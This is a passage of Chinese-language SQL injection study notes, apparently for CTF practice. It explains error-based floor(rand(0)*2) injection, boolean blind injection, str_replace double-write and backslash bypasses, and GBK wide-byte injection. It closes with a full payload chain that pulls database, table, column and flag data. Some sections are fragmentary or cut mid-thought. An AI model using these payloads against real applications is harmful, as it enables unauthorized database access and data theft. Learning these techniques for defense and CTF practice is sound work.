2.未对用户可控参数进行足够的过滤，便将参数内容拼接到SQL语句中

Rand函数在规定了种子之后，产生的序列是固定的

Rand产生固定序列

select floor (rand(0)*2) from information_schema.tables

查询语句

select username,count(*) from user group by floor(rand(0)*2)

第一次查询,floor函数值为0,虚拟表中没有0的记录,要将floor函数值进行插入所以floor函数会再运行一次,产生一个1,这个1就会被添加到虚拟表中

第二次查询,floor(rand(0)*2)返回1,虚拟表中存在1的记录,所以floor函数不会在运行一次,而是直接在count(*)这里+1

第三次查询 floor函数第四次执行,返回0,虚拟表中没有0的记录,要将floor函数值进行插入,所以floor函数会再运行一次,并且把1当作主键插入虚拟表
中,这时就会产生主键重复报错

3.3.1布尔盲注

使用条件：

有两种返回情况，用来判断对错

利用：人为的构造一个判断条件，当条件判断正确的时候，返回hello user；当条件判断错误时，什么都没有，就可以根据输入逐步判断出数据库中的数据

猜长度：

id=1 and length(database()) = 1%23

database()函数返回数据库名,length函数返回数据库名的长度,跟后面的1进行比较,如果相等,那么就返回true;如果不相等,
返回flase。之后进行一次and运算,前后两个参数都为true时,返回true,页面就会输出，如果length函数这里判断不相等,那么就会
返回flase,经过and运算,肯定也是返回flase,页面就不会回显数据

猜数据：

id=1 and if(ascii(substr((select database()),1,1))=119,1,0)%23

119为我们猜测的值,可以从0-255挨个试
substr()截取数据库名的第一位,asci函数返回数据库第一位的ASCII值,紧接着该ASCII值和119进行比较,如果相等,if函数返回1,如果不
相等if函数返回0

table_schema=database()),3,1))=118),1,0)%23

Payload分析:

Select 1 and -1;

Select 1 and 1;

猜测的值正确,strcmp函数会返回0

Select 1 and 0;

所以当猜测正确时,服务端返回的是错误的结果,而猜测错误时,返回的是正确的结果

因为使用的是ascii值,

7.5Str_replace替换导致的问题

7.5.1双写绕过

双写绕过一般是str_replace出现了替换为空的情况,因为str_replace是单次替换,不会在替换了一次之后重新检查字符串能不能再被替换

$username=str_replace(‘union’,”, $username);

针对这种方式,就可以利用username=uniunionon 这种形式绕过

7.5.2反斜线绕过

转义代码

把单引号转义成
$username=str_replace(“‘“, ‘\", $username);

输入

username=admin’ or 1=1%23

经过转义之后

admin'or 1=1#

这样就阻止了单引号被闭合

7.5.2.1使用\进行绕过

输入username=admin' or 1=1%23

单引号会被转义成'

然后我们输入的\不会被转义,就形成username=admin\\‘or 1=1%23所以我们输入的反斜线,就把服务器添加的反斜线给转义了

7.5.2.2宽字节注入

利用MySQL在进行数据传输时，编码的不一致，导致转义符号\被吃掉，从而绕过转义过滤

\ -> 5c

%df%5c -> 運

因为这里的df大于128，且MySQL使用了gbk编码，所以MySQL会认为df5c是一个汉字，这样就会把刚刚添加的反斜杠吃掉

username=admin%df’转义username=admin%df'

username=admin運’

注意：第一个字节范围要大于128，才能到达汉字的范围

Payload：

猜测注入点

username=admin%df’ or 1=1%23&password=ww

测列数

username=admin%df’ order by 3%23&password=ww

测试回显位

username=admin%df’ union select 1,2,3%23&password=ww

拿库名

username=admin%df’ union select 1,database(),3%23&password=ww

拿表名

username=admin%df’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&password=ww

拿列名

username=admin%df’ union select 1,group_concat(column_name),3 from information_schema.columns where
table name=0x666c6167%23&password=ww

因为存在转义过滤，直接写table_name=’flag’%23可能会被gbk编码吃掉，所以要改成十六进制

拿数据

username=admin%df’ union select 1,flag,3 from flag%23&password=ww
